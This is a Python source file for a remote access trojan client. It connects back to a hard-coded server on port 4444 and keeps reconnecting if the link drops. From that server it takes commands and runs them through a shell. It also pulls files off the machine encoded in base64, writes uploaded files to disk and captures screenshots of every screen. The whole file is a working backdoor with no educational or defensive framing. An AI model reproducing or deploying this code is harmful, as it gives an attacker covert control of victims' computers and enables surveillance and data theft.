import socket
import subprocess
import os
import base64
import time
import io

from utils import reliable_send, reliable_recv

# Screenshot
try:
    from PIL import ImageGrab
except:
    ImageGrab = None

SERVER_IP = "10.132.239.57"   # 🔴 CHANGE
SERVER_PORT = 4444


# -------------------- COMMAND --------------------

def execute_command(command):
    try:
        return subprocess.check_output(
            command,
            shell=True,
            stderr=subprocess.STDOUT
        ).decode(errors="ignore")
    except Exception as e:
        return "Error: " + str(e)


def change_dir(path):
    try:
        os.chdir(path)
        return "[+] Current Directory: " + os.getcwd()
    except Exception as e:
        return "[-] Failed: " + str(e)


# -------------------- FILE --------------------

def read_file(path):
    try:
        with open(path, "rb") as f:
            return base64.b64encode(f.read()).decode()
    except Exception as e:
        return "ERROR: " + str(e)


def write_file(path, content):
    try:
        with open(path, "wb") as f:
            f.write(base64.b64decode(content))
        return "[+] Upload successful"
    except Exception as e:
        return "ERROR: " + str(e)


# -------------------- SCREENSHOT --------------------

def capture_screenshot():
    if ImageGrab is None:
        return None
    try:
        screenshot = ImageGrab.grab(all_screens=True)
        buffer = io.BytesIO()
        screenshot.save(buffer, format="PNG")
        return base64.b64encode(buffer.getvalue()).decode()
    except Exception as e:
        return "ERROR: " + str(e)


# -------------------- CONNECTION --------------------

def connect():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((SERVER_IP, SERVER_PORT))
            print("[+] Connected to server")
            return sock
        except:
            time.sleep(5)


# -------------------- MAIN --------------------

def main():
    sock = connect()

    while True:
        try:
            command = reliable_recv(sock)

            if command == "exit":
                break

            elif command.startswith("download "):
                file_path = command.split(" ", 1)[1]
                data = read_file(file_path)
                reliable_send(sock, {"type": "file", "data": data})

            elif command.startswith("upload "):
                file_name = command.split(" ", 1)[1]
                file_data = reliable_recv(sock)
                result = write_file(file_name, file_data)
                reliable_send(sock, {"type": "text", "data": result})

            elif command == "screenshot":
                image_data = capture_screenshot()
                reliable_send(sock, {"type": "image", "data": image_data})

            elif command.startswith("cd "):
                result = change_dir(command[3:])
                reliable_send(sock, {"type": "text", "data": result})

            else:
                result = execute_command(command)
                reliable_send(sock, {"type": "text", "data": result})

        except Exception as e:
            print("ERROR:", e)
            sock.close()
            sock = connect()

    sock.close()


main()
